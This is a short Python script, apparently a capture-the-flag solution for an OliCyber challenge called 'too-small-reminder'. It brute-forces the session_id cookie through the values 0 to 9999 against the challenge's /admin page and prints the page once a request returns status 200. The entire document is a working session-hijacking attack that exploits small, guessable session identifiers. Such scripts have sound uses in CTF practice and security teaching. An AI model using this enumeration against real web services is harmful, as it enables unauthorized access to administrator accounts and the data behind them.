import requests

s = requests.Session()
url = 'http://too-small-reminder.challs.olicyber.it/admin'

for i in range(10_000):
    
    r = s.get(url, cookies={"session_id" : f'{i}'})

    
    print(r.status_code, 'cookie: ', i )
    if r.status_code == 200:
        print(r.text)
        break
    
 